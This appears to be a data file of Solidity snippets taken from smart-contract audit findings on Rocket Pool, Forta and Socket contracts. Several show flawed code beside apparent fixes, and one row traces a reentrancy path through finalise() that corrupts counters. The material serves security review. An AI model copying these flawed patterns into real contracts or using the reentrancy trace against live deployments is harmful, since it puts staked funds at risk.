```\nerror RouteAlreadyExist();\nerror SwapFailed();\nerror UnsupportedInterfaceId();\nerror ContractContainsNoCode();\nerror InvalidCelerRefund();\nerror CelerAlreadyRefunded();\nerror ControllerAlreadyExist();\nerror ControllerAddressIsZero();
"```\nfunction bridge(\n    uint32 routeId,\n    bytes memory data\n) external payable returns (bytes memory) {\n}"
"```\nfunction executeRoutes(\n    uint32[] calldata routeIds,\n    bytes[] calldata dataItems,\n    bytes[] calldata eventDataItems\n) external payable {\n    uint256 routeIdslength = routeIds.length;\n    for (uint256 index = 0; index < routeIdslength; index++) {\n        (bool success, bytes memory result) = addressAt(routeIds[index]).delegatecall(dataItems[index]);\n\n        if (!success) {\n            assembly {\n                revert(add(result, 32), mload(result))\n            }\n        }\n\n        emit SocketRouteExecuted(routeIds[index], eventDataItems[index]);\n    }\n}\n```"
```\nfunction destroy(uint256 routeId) external onlyDisabler {\n```
"```\nfunction distribute() override external {\n    uint256 nodeShare = getNodeShare();\n    address withdrawalAddress = rocketStorage.getNodeWithdrawalAddress(nodeAddress);\n    (bool success,) = withdrawalAddress.call{value: nodeShare}("""");\n    require(success);\n    uint256 userShare = address(this).balance;\n    address rocketTokenRETH = rocketStorage.getAddress(rocketTokenRETHKey);\n    payable(rocketTokenRETH).transfer(userShare);\n    emit FeesDistributed(nodeAddress, userShare, nodeShare, block.timestamp);\n}\n```\n```\nfunction setWithdrawalAddress(\n    address _nodeAddress,\n    address _newWithdrawalAddress,\n    bool _confirm\n) external override {\n    require(_newWithdrawalAddress!= address(0x0), ""Invalid withdrawal address"");\n    address withdrawalAddress = getNodeWithdrawalAddress(_nodeAddress);\n    require(withdrawalAddress == msg.sender, ""Only a tx from a node's withdrawal address can update it"");\n    if (_confirm) {\n        updateWithdrawalAddress(_nodeAddress, _newWithdrawalAddress);\n    } else {\n        pendingWithdrawalAddresses[_nodeAddress] = _newWithdrawalAddress;\n    }\n}\n```"
"```\nfinalise() ->\n  status == MinipoolStatus.Withdrawable  &&\n  withdrawalBlock > 0  &&\n  _finalise() ->\n   !finalised  &&\n    _refund() ->\n      nodeRefundBalance = 0  &&\n      extCall: nodeWithdrawalAddress  &&\n      reenter: finalise() ->\n        status == MinipoolStatus.Withdrawable  &&\n        withdrawalBlock > 0  &&\n        _finalise() ->\n         !finalised  &&\n          nodeRefundBalance > 0  &&\n          address(this).balance to RETH  &&\n          RocketTokenRETHInterface(rocketTokenRETH).depositExcessCollateral()  &&\n          rocketMinipoolManager.incrementNodeFinalisedMinipoolCount(nodeAddress)  &&\n          eventually call rocketDAONodeTrusted.decrementMemberUnbondedValidatorCount(nodeAddress)  &&\n          finalised = true\n      <--- return from reentrant call\n    <--- return from _refund()\n  address(this).balance to RETH  &&\n  RocketTokenRETHInterface(rocketTokenRETH).depositExcessCollateral()  &&\n  rocketMinipoolManager.incrementNodeFinalisedMinipoolCount(nodeAddress)  &&\n  'node.minipools.finalised.count','minipools.finalised.count', reduces 'eth.matched.node.amount' one to many times\n  eventually call rocketDAONodeTrusted.decrementMemberUnbondedValidatorCount(nodeAddress)  &&\n 'member.validator.unbonded.count' by +1\n  finalised = true\n<--- returns\n```\n```\nfunction finalise() external override onlyInitialised onlyMinipoolOwnerOrWithdrawalAddress(msg.sender) {\n    require(status == MinipoolStatus.Withdrawable, ""Minipool must be withdrawable"");\n    require(withdrawalBlock > 0, ""Minipool balance must have been distributed at least once"");\n    _finalise();\n}\n```\n```\nfunction _finalise() private {\n    // Get contracts\n    RocketMinipoolManagerInterface rocketMinipoolManager = \n        RocketMinipoolManagerInterface(getContractAddress(""rocketMinipoolManager""));\n\n    // Can only finalise the pool once\n    require(!finalised, ""Minipool has already been finalised"");\n\n    // If slash is required then perform it\n    if (nodeSlashBalance > 0) {\n        _slash();\n    }\n\n    // Refund node operator if required\n    if (nodeRefundBalance > 0) {\n        _refund();\n    }\n\n    // Send any left over ETH to rETH contract\n    if (address(this).balance > 0) {\n        // Send user amount to rETH contract\n        payable(rocketTokenRETH).transfer(address(this).balance);\n    }\n\n    // Trigger a deposit of excess collateral from rETH contract to deposit pool\n    RocketTokenRETHInterface(rocketTokenRETH).depositExcessCollateral();\n\n    // Unlock node operator's RPL\n    rocketMinipoolManager.incrementNodeFinalisedMinipoolCount(nodeAddress);\n\n    // Update unbonded validator count if minipool is unbonded\n    if (depositType == MinipoolDeposit.Empty) {\n        RocketDAONodeTrustedInterface rocketDAONodeTrusted = \n            RocketDAONodeTrustedInterface(getContractAddress(""rocketDAONodeTrusted""));\n        rocketDAONodeTrusted.decrementMemberUnbondedValidatorCount(nodeAddress);\n    }\n\n    // Set finalised flag\n    finalised = true;\n}\n```\n```\nfunction _refund() private {\n    uint256 refundAmount = nodeRefundBalance;\n    nodeRefundBalance = 0;\n\n    address nodeWithdrawalAddress = rocketStorage.getNodeWithdrawalAddress(nodeAddress);\n\n    (bool success,) = nodeWithdrawalAddress.call{value: refundAmount}("""");\n    require(success, ""ETH refund amount was not successfully transferred to node operator"");\n\n    emit EtherWithdrawn(nodeWithdrawalAddress, refundAmount, block.timestamp);\n}\n```\n```\nfunction incrementNodeFinalisedMinipoolCount(address _nodeAddress) override external onlyLatestContract(""rocketMinipoolManager"", address(this)) onlyRegisteredMinipool(msg.sender) {\n    addUint(keccak256(abi.encodePacked(""node.minipools.finalised.count"", _nodeAddress)), 1);\n    addUint(keccak256(bytes(""minipools.finalised.count"")), 1);\n}\n```\n```\nfunction decrementMemberUnbondedValidatorCount(address _nodeAddress) override external onlyLatestContract(""rocketDAONodeTrusted"", address(this)) onlyRegisteredMinipool(msg.sender) {\n    subUint(keccak256(abi.encodePacked(daoNameSpace, ""member.validator.unbonded.count"", _nodeAddress)), 1);\n}\n```"
"```\nfunction _slash() private {\n    // Get contracts\n    RocketNodeStakingInterface rocketNodeStaking = RocketNodeStakingInterface(getContractAddress(""rocketNodeStaking""));\n\n    // Slash required amount and reset storage value\n    uint256 slashAmount = nodeSlashBalance;\n    nodeSlashBalance = 0;\n    rocketNodeStaking.slashRPL(nodeAddress, slashAmount);\n\n    // Record slashing\n    slashed = true;\n}\n```\n```\nfunction _slash() private {\n    // Get contracts\n    RocketNodeStakingInterface rocketNodeStaking = RocketNodeStakingInterface(getContractAddress(""rocketNodeStaking""));\n\n    // Slash required amount and reset storage value\n    uint256 slashAmount = nodeSlashBalance;\n    nodeSlashBalance = 0;\n    rocketNodeStaking.slashRPL(nodeAddress, slashAmount);\n}\n```"
"```\nfunction actionChallengeMake(address _nodeAddress) override external onlyTrustedNode(_nodeAddress) onlyRegisteredNode(msg.sender) onlyLatestContract(""rocketDAONodeTrustedActions"", address(this)) payable {\n    RocketDAONodeTrustedInterface rocketDAONode = RocketDAONodeTrustedInterface(getContractAddress(""rocketDAONodeTrusted""));\n    RocketDAONodeTrustedSettingsMembersInterface rocketDAONodeTrustedSettingsMembers = RocketDAONodeTrustedSettingsMembersInterface(getContractAddress(""rocketDAONodeTrustedSettingsMembers""));\n\n    if (rocketDAONode.getMemberIsValid(msg.sender)!= true) {\n        require(msg.value == rocketDAONodeTrustedSettingsMembers.getChallengeCost(), ""Non DAO members must pay ETH to challenge a members node"");\n    }\n\n    require(msg.sender!= _nodeAddress, ""You cannot challenge yourself"");\n\n    // Is this member already being challenged?\n```"
"```\nfunction close() override external onlyMinipoolOwner(msg.sender) onlyInitialised {\n    require(status == MinipoolStatus.Dissolved, ""The minipool can only be closed while dissolved"");\n    distributeToOwner();\n    RocketMinipoolManagerInterface rocketMinipoolManager = RocketMinipoolManagerInterface(getContractAddress(""rocketMinipoolManager""));\n    require(rocketMinipoolManager.getMinipoolExists(address(this)), ""Minipool already closed"");\n    rocketMinipoolManager.destroyMinipool();\n    nodeDepositBalance = 0;\n    nodeRefundBalance = 0;\n    userDepositBalance = 0;\n    userDepositBalanceLegacy = 0;\n    userDepositAssignedTime = 0;\n}\n```\n```\nwithdrawalBlock = block.number\n```\n```\nfunction _slash() private {\n    RocketNodeStakingInterface rocketNodeStaking = RocketNodeStakingInterface(getContractAddress(""rocketNodeStaking""));\n\n    uint256 slashAmount = nodeSlashBalance;\n    nodeSlashBalance = 0;\n    rocketNodeStaking.slashRPL(nodeAddress, slashAmount);\n\n    slashed = true;\n}\n```\n```\nuint256 newBondAmount = getUint(keccak256(abi.encodePacked(""minipool.bond.reduction.value"", msg.sender)));\nrequire(rocketNodeDeposit.isValidDepositAmount(newBondAmount), ""Invalid bond amount"");\n\nuint256 existingBondAmount = minipool.getNodeDepositBalance();\nuint256 delta = existingBondAmount.sub(newBondAmount);\n\naddress nodeAddress = minipool.getNodeAddress();\n\nrocketNodeDeposit.increaseEthMatched(nodeAddress, delta);\n\nrocketNodeDeposit.increaseDepositCreditBalance(nodeAddress, delta);\n\ndeleteUint(keccak256(abi.encodePacked(""minipool.bond.reduction.time"", msg.sender)));\ndeleteUint(keccak256(abi.encodePacked(""minipool.bond.reduction.value"", msg.sender)));\n```\n```\nrplContract.inflationMintTokens()\nincrementRewardIndex()"
"```\nfunction refund() override external onlyMinipoolOwnerOrWithdrawalAddress(msg.sender) onlyInitialised {\n    require(nodeRefundBalance > 0, ""No amount of the node deposit is available for refund"");\n\n    if (!finalised && userDistributed) {\n        _finalise();\n    }\n\n    _refund();\n}\n```\n```\nfunction _finalise() private {\n    // Get contracts\n    RocketMinipoolManagerInterface rocketMinipoolManager = RocketMinipoolManagerInterface(getContractAddress(""rocketMinipoolManager""));\n\n    // Can only finalise the pool once\n    require(!finalised, ""Minipool has already been finalised"");\n\n    // Set finalised flag\n    finalised = true;\n\n    // If slash is required then perform it\n    if (nodeSlashBalance > 0) {\n        _slash();\n    }\n\n    // Refund node operator if required\n    if (nodeRefundBalance > 0) {\n        _refund();\n    }\n}"
"```\nrequire(nodeRefundBalance == 0, ""Refund balance not zero"")\n```\n```\nrocketMinipoolManager.removeVacantMinipool()\n```\n```\nif (ownerCalling) {\n    _finalise();\n}"
"```\nfallback() external payable {\n    address _target = rocketStorage.getAddress(distributorStorageKey);\n    assembly {\n        calldatacopy(0x0, 0x0, calldatasize())\n        let result := delegatecall(gas(), _target, 0x0, calldatasize(), 0x0, 0)\n        returndatacopy(0x0, 0x0, returndatasize())\n        switch result {\n            case 0 {\n                revert(0, returndatasize())\n            }\n            default {\n                return (0, returndatasize())\n            }\n        }\n    }\n}\n```\n```\nfunction getAddress(bytes32 _key) override external view returns (address r) {\n    return addressStorage[_key];\n}\n```"
"```\nRocketDAONodeTrustedInterface rocketDAONodeTrusted = RocketDAONodeTrustedInterface(getContractAddress(""rocketDAONodeTrusted""));\n\nif (calcBase.mul(submissionCount).div(rocketDAONodeTrusted.getMemberCount()) >= rocketDAOProtocolSettingsNetwork.getNodeConsensusThreshold()) {\n    updatePrices(_block, _rplPrice);\n}\n```\n```\nfunction executeUpdatePrices(uint256 _block, uint256 _rplPrice) override external onlyLatestContract(""rocketNetworkPrices"", address(this)) {\n    // Check settings\n```\n```\nRocketDAONodeTrustedSettingsMinipoolInterface rocketDAONodeTrustedSettingsMinipool = \n    RocketDAONodeTrustedSettingsMinipoolInterface(getContractAddress(""rocketDAONodeTrustedSettingsMinipool""));\n\nuint256 quorum = rocketDAONode.getMemberCount().mul(rocketDAONodeTrustedSettingsMinipool.getCancelBondReductionQuorum()).div(calcBase);\n\nbytes32 totalCancelVotesKey = keccak256(abi.encodePacked(""minipool.bond.reduction.vote.count"", _minipoolAddress));\nuint256 totalCancelVotes = getUint(totalCancelVotesKey).add(1);\n\nif (totalCancelVotes > quorum) {\n```\n```\nRocketDAONodeTrustedInterface rocketDAONodeTrusted = RocketDAONodeTrustedInterface(getContractAddress(""rocketDAONodeTrusted""));\n\nif (calcBase.mul(submissionCount).div(rocketDAONodeTrusted.getMemberCount()) >= rocketDAOProtocolSettingsNetwork.getNodePenaltyThreshold()) {\n    setBool(executedKey, true);\n    incrementMinipoolPenaltyCount(_minipoolAddress);\n}\n```\n```\nfunction executeUpdatePenalty(address _minipoolAddress, uint256 _block) override external onlyLatestContract(""rocketNetworkPenalties"", address(this)) {\n    RocketDAOProtocolSettingsNetworkInterface rocketDAOProtocolSettingsNetwork = \n        RocketDAOProtocolSettingsNetworkInterface(getContractAddress(""rocketDAOProtocolSettingsNetwork""));\n    // Get submission keys\n```"
"```\nfunction setSettingRewardsClaimer(string memory _contractName, uint256 _perc) override public onlyDAOProtocolProposal {\n    uint256 percTotal = getRewardsClaimersPercTotal();\n    uint256 percTotalUpdate = percTotal.add(_perc).sub(getRewardsClaimerPerc(_contractName));\n    require(percTotalUpdate <= 1 ether, ""Claimers cannot total more than 100%"");\n    setUint(keccak256(abi.encodePacked(""rewards.claims"", ""group.totalPerc"")), percTotalUpdate);\n    setUint(keccak256(abi.encodePacked(""rewards.claims"", ""group.amount"", _contractName)), _perc);\n    setUint(keccak256(abi.encodePacked(""rewards.claims"", ""group.amount.updated.time"", _contractName)), block.timestamp);\n}\n```"
"```\nfunction setSettingRewardsClaimer(string memory _contractName, uint256 _perc) override public onlyDAOProtocolProposal {\n    uint256 percTotal = getRewardsClaimersPercTotal();\n    uint256 percTotalUpdate = percTotal.add(_perc).sub(getRewardsClaimerPerc(_contractName));\n    require(percTotalUpdate <= 1 ether, ""Claimers cannot total more than 100%"");\n    setUint(keccak256(abi.encodePacked(""rewards.claims"", ""group.totalPerc"")), percTotalUpdate);\n    setUint(keccak256(abi.encodePacked(""rewards.claims"", ""group.amount"", _contractName)), _perc);\n    setUint(keccak256(abi.encodePacked(""rewards.claims"", ""group.amount.updated.time"", _contractName)), block.timestamp);\n}\n```"
"```\nfunction initialise(address _rocketStorage, address _nodeAddress) external override notSelf {\n    require(_nodeAddress!= address(0), ""Invalid node address"");\n    require(storageState == StorageState.Undefined, ""Already initialised"");\n\n    storageState = StorageState.Uninitialised;\n    rocketStorage = RocketStorageInterface(_rocketStorage);\n}\n```\n```\nfunction beginReduceBondAmount(\n    address _minipoolAddress,\n    uint256 _newBondAmount\n) override external onlyLatestContract(""rocketMinipoolBondReducer"", address(this)) {\n    RocketMinipoolInterface minipool = RocketMinipoolInterface(_minipoolAddress);\n```\n```\nfunction canReduceBondAmount(address _minipoolAddress) override public view returns (bool) {\n    RocketMinipoolInterface minipool = RocketMinipoolInterface(_minipoolAddress);\n    RocketDAONodeTrustedSettingsMinipoolInterface rocketDAONodeTrustedSettingsMinipool = \n        RocketDAONodeTrustedSettingsMinipoolInterface(getContractAddress(""rocketDAONodeTrustedSettingsMinipool""));\n    uint256 reduceBondTime = getUint(keccak256(abi.encodePacked(""minipool.bond.reduction.time"", _minipoolAddress)));\n    return rocketDAONodeTrustedSettingsMinipool.isWithinBondReductionWindow(block.timestamp.sub(reduceBondTime));\n}\n```\n```\nfunction voteCancelReduction(address _minipoolAddress) override external onlyTrustedNode(msg.sender) onlyLatestContract(""rocketMinipoolBondReducer"", address(this)) {\n    require(!getReduceBondCancelled(_minipoolAddress), ""Already cancelled"");\n    RocketMinipoolInterface minipool = RocketMinipoolInterface(_minipoolAddress);\n```\n```\nTest example = Test(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4)\nabi.encodePacked(""hi"", example)\n0x68695b38da6a701c568545dcfcb03fcb875f56beddc4\nabi.encodePacked(""hi"", address(example))\n0x68695b38da6a701c568545dcfcb03fcb875f56beddc4\n```\n```\nfunction _setMinipoolPubkey(address _minipool, bytes calldata _pubkey) private {\n    AddressSetStorageInterface addressSetStorage = AddressSetStorageInterface(getContractAddress(""addressSetStorage""));\n    RocketMinipoolInterface minipool = RocketMinipoolInterface(_minipool);\n```\n```\nfunction getMinipoolDetails(address _minipoolAddress) override external view returns (MinipoolDetails memory) {\n    RocketMinipoolInterface minipoolInterface = RocketMinipoolInterface(_minipoolAddress);\n    RocketMinipoolBase minipool = RocketMinipoolBase(payable(_minipoolAddress));\n    RocketNetworkPenaltiesInterface rocketNetworkPenalties = RocketNetworkPenaltiesInterface(getContractAddress(""rocketNetworkPenalties""));\n```\n```\ncontract RocketNodeDistributor is RocketNodeDistributorStorageLayout {\n    bytes32 immutable distributorStorageKey;\n\n    constructor(address _nodeAddress, address _rocketStorage) {\n        rocketStorage = RocketStorageInterface(_rocketStorage);\n        nodeAddress = _nodeAddress;\n    }\n}"
"```\nconstructor(RocketStorageInterface _rocketStorageAddress) {\n    rocketStorage = RocketStorageInterface(_rocketStorageAddress);\n}\n```\n```\nfunction burnToken(ERC20Burnable _tokenAddress, uint256 _amount) override external onlyLatestNetworkContract {\n    bytes32 contractKey = keccak256(abi.encodePacked(getContractName(msg.sender), _tokenAddress));\n    tokenBalances[contractKey] = tokenBalances[contractKey].sub(_amount);\n    ERC20Burnable tokenContract = ERC20Burnable(_tokenAddress);\n}\n```\n```\nconstructor(RocketStorageInterface _rocketStorageAddress, IERC20 _rocketTokenRPLFixedSupplyAddress) public RocketBase(_rocketStorageAddress) ERC20(""Rocket Pool Protocol"", ""RPL"") {\n    version = 1;\n    rplFixedSupplyContract = IERC20(_rocketTokenRPLFixedSupplyAddress);\n}\n```"
"```\nfunction prepareVacancy(uint256 _bondAmount, uint256 _currentBalance) override external onlyLatestContract(""rocketMinipoolManager"", msg.sender) onlyInitialised {\n    require(status == MinipoolStatus.Initialised, ""Must be in initialised status"");\n    require(nodeRefundBalance == 0, ""Refund balance not zero"");\n\n    RocketDAOProtocolSettingsMinipoolInterface rocketDAOProtocolSettingsMinipool = \n        RocketDAOProtocolSettingsMinipoolInterface(getContractAddress(""rocketDAOProtocolSettingsMinipool""));\n    uint256 launchAmount = rocketDAOProtocolSettingsMinipool.getLaunchBalance();\n    require(_currentBalance >= launchAmount, ""Balance is too low"");\n\n    nodeDepositBalance = _bondAmount;\n    userDepositBalance = launchAmount.sub(nodeDepositBalance);\n    vacant = true;\n    preMigrationBalance = _currentBalance;\n    nodeRefundBalance = _currentBalance.sub(launchAmount);\n    setStatus(MinipoolStatus.Prelaunch);\n}"
"```\nmodifier onlyMinipoolOwner() {\n    address withdrawalAddress = rocketStorage.getNodeWithdrawalAddress(nodeAddress);\n    require(msg.sender == nodeAddress || msg.sender == withdrawalAddress, ""Only the node operator can access this method"");\n    _\n}\n```\n```\nmodifier onlyMinipoolOwner() {\n    address withdrawalAddress = rocketStorage.getNodeWithdrawalAddress(nodeAddress);\n    require(msg.sender == nodeAddress || msg.sender == withdrawalAddress, ""Only the node operator can access this method"");\n}\n```\n```\nmodifier onlyMinipoolOwner(address _nodeAddress) {\n    require(_nodeAddress == nodeAddress, ""Invalid minipool owner"");\n    _\n}\n\nmodifier onlyMinipoolOwnerOrWithdrawalAddress(address _nodeAddress) {\n    require(_nodeAddress == nodeAddress || _nodeAddress == rocketStorage.getNodeWithdrawalAddress(nodeAddress), ""Invalid minipool owner"");\n    _\n}\n```\n```\nmodifier onlyMinipoolOwner(address _nodeAddress) {\n    require(_nodeAddress == nodeAddress, ""Invalid minipool owner"");\n    _\n}\n\nmodifier onlyMinipoolOwnerOrWithdrawalAddress(address _nodeAddress) {\n    require(_nodeAddress == nodeAddress || _nodeAddress == rocketStorage.getNodeWithdrawalAddress(nodeAddress), ""Invalid minipool owner"");\n    _\n}\n```"
"```\nbytes32 settingNameSpace;\n```\n```\nconstructor(RocketStorageInterface _rocketStorageAddress, string memory _settingNameSpace) public RocketBase(_rocketStorageAddress) {\n    settingNameSpace = keccak256(abi.encodePacked(""dao.trustednodes.setting."", _settingNameSpace));\n}\n```\n```\nbytes32 settingNameSpace;\n```\n```\nconstructor(RocketStorageInterface _rocketStorageAddress, string memory _settingNameSpace) public RocketBase(_rocketStorageAddress) {\n    settingNameSpace = keccak256(abi.encodePacked(""dao.protocol.setting."", _settingNameSpace));\n}\n```\n```\nconstructor(RocketStorageInterface _rocketStorageAddress) RocketDAOProtocolSettings(_rocketStorageAddress, ""auction"") {\n    version = 1;\n}\n```"
"```\nRocketDAONodeTrustedInterface rocketDAONodeTrusted = RocketDAONodeTrustedInterface(getContractAddress(""rocketDAONodeTrusted""));\n\nif (calcBase.mul(submissionCount).div(rocketDAONodeTrusted.getMemberCount()) >= rocketDAOProtocolSettingsNetwork.getNodeConsensusThreshold()) {\n    updatePrices(_block, _rplPrice);\n}\n```\n```\nfunction executeUpdatePrices(uint256 _block, uint256 _rplPrice) override external onlyLatestContract(""rocketNetworkPrices"", address(this)) {\n    // Check settings\n```\n```\nRocketDAONodeTrustedSettingsMinipoolInterface rocketDAONodeTrustedSettingsMinipool = \n    RocketDAONodeTrustedSettingsMinipoolInterface(getContractAddress(""rocketDAONodeTrustedSettingsMinipool""));\n\nuint256 quorum = rocketDAONode.getMemberCount().mul(rocketDAONodeTrustedSettingsMinipool.getCancelBondReductionQuorum()).div(calcBase);\n\nbytes32 totalCancelVotesKey = keccak256(abi.encodePacked(""minipool.bond.reduction.vote.count"", _minipoolAddress));\nuint256 totalCancelVotes = getUint(totalCancelVotesKey).add(1);\n\nif (totalCancelVotes > quorum) {\n```\n```\nRocketDAONodeTrustedInterface rocketDAONodeTrusted = RocketDAONodeTrustedInterface(getContractAddress(""rocketDAONodeTrusted""));\n\nif (calcBase.mul(submissionCount).div(rocketDAONodeTrusted.getMemberCount()) >= rocketDAOProtocolSettingsNetwork.getNodePenaltyThreshold()) {\n    setBool(executedKey, true);\n    incrementMinipoolPenaltyCount(_minipoolAddress);\n}\n```\n```\nfunction executeUpdatePenalty(address _minipoolAddress, uint256 _block) override external onlyLatestContract(""rocketNetworkPenalties"", address(this)) {\n    RocketDAOProtocolSettingsNetworkInterface rocketDAOProtocolSettingsNetwork = \n        RocketDAOProtocolSettingsNetworkInterface(getContractAddress(""rocketDAOProtocolSettingsNetwork""));\n    // Get submission keys\n```"
"```\nfunction _beforeTokenTransfer(\n    address operator,\n    address from,\n    address to,\n    uint256[] memory ids,\n    uint256[] memory amounts,\n    bytes memory data\n) internal virtual override {\n    for (uint256 i = 0; i < ids.length; i++) {\n        if (FortaStakingUtils.isActive(ids[i])) {\n            uint8 subjectType = FortaStakingUtils.subjectTypeOfShares(ids[i]);\n            if (subjectType == DELEGATOR_NODE_RUNNER_SUBJECT && to!= address(0) && from!= address(0)) {\n                _allocator.didTransferShares(ids[i], subjectType, from, to, amounts[i]);\n            }\n```\n```\nfunction didTransferShares(\n    uint256 sharesId,\n    uint8 subjectType,\n    address from,\n    address to,\n    uint256 sharesAmount\n) external {\n    _rewardsDistributor.didTransferShares(sharesId, subjectType, from, to, sharesAmount);\n}\n```"
"```\nfunction didAllocate(\n    uint8 subjectType,\n    uint256 subject,\n    uint256 stakeAmount,\n    uint256 sharesAmount,\n    address staker\n) external onlyRole(ALLOCATOR_CONTRACT_ROLE) {\n    bool delegated = getSubjectTypeAgency(subjectType) == SubjectStakeAgency.DELEGATED;\n    if (delegated) {\n        uint8 delegatorType = getDelegatorSubjectType(subjectType);\n        uint256 shareId = FortaStakingUtils.subjectToActive(delegatorType, subject);\n        DelegatedAccRewards storage s = _rewardsAccumulators[shareId];\n        s.delegated.addRate(stakeAmount);\n```\n```\nfunction addRate(Accumulator storage acc, uint256 rate) internal {\n    setRate(acc, latest(acc).rate + rate);\n}\n```\n```\nfunction setRate(Accumulator storage acc, uint256 rate) internal {\n    EpochCheckpoint memory ckpt = EpochCheckpoint({\n        timestamp: SafeCast.toUint32(block.timestamp),\n        rate: SafeCast.toUint224(rate),\n        value: getValue(acc)\n    });\n    uint256 length = acc.checkpoints.length;\n    if (length > 0 && isCurrentEpoch(acc.checkpoints[length - 1].timestamp)) {\n        acc.checkpoints[length - 1] = ckpt;\n    } else {\n        acc.checkpoints.push(ckpt);\n    }\n}\n```\n```\nfunction getCurrentEpochTimestamp() internal view returns (uint256) {\n    return ((block.timestamp / EPOCH_LENGTH) * EPOCH_LENGTH) + TIMESTAMP_OFFSET;\n}\n\nfunction isCurrentEpoch(uint256 timestamp) internal view returns (bool) {\n    uint256 currentEpochStart = getCurrentEpochTimestamp();\n    return timestamp > currentEpochStart;\n}\n```\n```\nfunction getEpochNumber(uint256 timestamp) internal pure returns (uint32) {\n    return SafeCast.toUint32((timestamp - TIMESTAMP_OFFSET) / EPOCH_LENGTH);\n}\n```\n```\nfunction getCurrentEpochTimestamp() public view returns (uint256) {\n    return (getEpochNumber(block.timestamp) * EPOCH_LENGTH) + TIMESTAMP_OFFSET;\n}\n```\n```\nif (length > 0 && isCurrentEpoch(acc.checkpoints[length - 1].timestamp)) {\n    acc.checkpoints[length - 1] = ckpt;\n} else {\n    acc.checkpoints.push(ckpt);\n}\n```\n```\nfunction getEpochEndTimestamp(uint256 epochNumber) public pure returns (uint256) {\n    return ((epochNumber + 1) * EPOCH_LENGTH) + TIMESTAMP_OFFSET - 1;  // so it is 23:59:59 instead of next day 00:00:00\n}\n\nfunction isCurrentEpoch(uint256 timestamp) public view returns (bool) {\n    uint256 currentEpochStart = getCurrentEpochTimestamp();\n    return timestamp >= currentEpochStart;\n}\n```"
"```\nfunction dismissSlashProposal(\n    uint256 _proposalId,\n    string[] calldata _evidence\n) external onlyRole(SLASHING_ARBITER_ROLE) {\n    _transition(_proposalId, DISMISSED);\n    _submitEvidence(_proposalId, DISMISSED, _evidence);\n    _returnDeposit(_proposalId);\n    _unfreeze(_proposalId);\n}\n```\n```\nfunction rejectSlashProposal(uint256 _proposalId, string[] calldata _evidence) external onlyRole(SLASHING_ARBITER_ROLE) {\n    _transition(_proposalId, REJECTED);\n    _submitEvidence(_proposalId, REJECTED, _evidence);\n    _slashDeposit(_proposalId);\n    _unfreeze(_proposalId);\n}\n```\n```\nfunction reviewSlashProposalParameters(\n    uint256 _proposalId,\n    uint8 _subjectType,\n    uint256 _subjectId,\n    bytes32 _penaltyId,\n    string[] calldata _evidence\n) external onlyRole(SLASHING_ARBITER_ROLE) onlyInState(_proposalId, IN_REVIEW) onlyValidSlashPenaltyId(_penaltyId) onlyValidSubjectType(_subjectType) notAgencyType(_subjectType, SubjectStakeAgency.DELEGATOR) {\n    if (!subjectGateway.isRegistered(_subjectType, _subjectId)) {\n        revert NonRegisteredSubject(_subjectType, _subjectId);\n    }\n\n    _submitEvidence(_proposalId, IN_REVIEW, _evidence);\n    if (_subjectType!= proposals[_proposalId].subjectType || _subjectId!= proposals[_proposalId].subjectId) {\n        _unfreeze(_proposalId);\n        _freeze(_subjectType, _subjectId);\n    }\n}\n```\n```\nfunction revertSlashProposal(uint256 _proposalId, string[] calldata _evidence) external {\n    _authorizeRevertSlashProposal(_proposalId);\n    _transition(_proposalId, REVERTED);\n    _submitEvidence(_proposalId, REVERTED, _evidence);\n    _unfreeze(_proposalId);\n}\n```\n```\nfunction executeSlashProposal(uint256 _proposalId) external onlyRole(SLASHER_ROLE) {\n    _transition(_proposalId, EXECUTED);\n    Proposal memory proposal = proposals[_proposalId];\n    slashingExecutor.slash(\n        proposal.subjectType,\n        proposal.subjectId,\n        getSlashedStakeValue(_proposalId),\n        proposal.proposer,\n        slashPercentToProposer\n    );\n    slashingExecutor.freeze(\n        proposal.subjectType,\n        proposal.subjectId,\n        false\n    );\n}\n```\n```\nfunction _unfreeze(uint256 _proposalId) private {\n    slashingExecutor.freeze(proposals[_proposalId].subjectType, proposals[_proposalId].subjectId, false);\n}\n```"
```\nuint256[50] private _gap;\n```\n```\nuint256[41] private _gap; // 50 - 1 (frontRunningDelay) - 3 (_stakeThreshold) - 5 StakeSubjectUpgradeable\n```\n```\nuint256[49] private _gap;\n```\n```\nuint256[47] private _gap;\n```\n```\nuint256[44] private _gap;\n```
"```\nfunction createAgent(\n    uint256 agentId,\n    address owner,\n    string calldata metadata,\n    uint256[] calldata chainIds\n) public\n    onlySorted(chainIds)\n    frontrunProtected(keccak256(abi.encodePacked(agentId, owner, metadata, chainIds)), frontRunningDelay)\n{\n    _mint(owner, agentId);\n    _beforeAgentUpdate(agentId, metadata, chainIds);\n    _agentUpdate(agentId, metadata, chainIds);\n    _afterAgentUpdate(agentId, metadata, chainIds);\n}\n```"
"```\nfunction reward(\n    uint8 subjectType,\n    uint256 subjectId,\n    uint256 amount,\n    uint256 epochNumber\n) external onlyRole(REWARDER_ROLE) {\n    if (subjectType!= NODE_RUNNER_SUBJECT) {\n        revert InvalidSubjectType(subjectType);\n    }\n    if (!_subjectGateway.isRegistered(subjectType, subjectId)) {\n        revert RewardingNonRegisteredSubject(subjectType, subjectId);\n    }\n    uint256 shareId = FortaStakingUtils.subjectToActive(getDelegatorSubjectType(subjectType), subjectId);\n    _rewardsPerEpoch[shareId][epochNumber] = amount;\n    totalRewardsDistributed += amount;\n    emit Rewarded(subjectType, subjectId, amount, epochNumber);\n}\n```"
"```\ncontract FortaStaking is \n    BaseComponentUpgradeable, \n    ERC1155SupplyUpgradeable, \n    SubjectTypeValidator, \n    ISlashingExecutor, \n    IStakeMigrator {\n```\n```\nfunction deposit(\n    uint8 subjectType,\n    uint256 subject,\n    uint256 stakeValue\n) external\n    onlyValidSubjectType(subjectType)\n    notAgencyType(subjectType, SubjectStakeAgency.MANAGED)\n    returns (uint256)\n{\n    if (address(subjectGateway) == address(0)) {\n        revert ZeroAddress(""subjectGateway"");\n    }\n    if (!subjectGateway.isStakeActivatedFor(subjectType, subject)) {\n        revert StakeInactiveOrSubjectNotFound();\n    }\n    address staker = _msgSender();\n    uint256 activeSharesId = FortaStakingUtils.subjectToActive(subjectType, subject);\n    bool reachedMax;\n    (stakeValue, reachedMax) = _getInboundStake(subjectType, subject, stakeValue);\n    if (reachedMax) {\n        emit MaxStakeReached(subjectType, subject);\n    }\n    uint256 sharesValue = stakeToActiveShares(activeSharesId, stakeValue);\n    SafeERC20.safeTransferFrom(stakedToken, staker, address(this), stakeValue);\n\n    _activeStake.mint(activeSharesId, stakeValue);\n    _mint(staker, activeSharesId, sharesValue, new bytes(0));\n  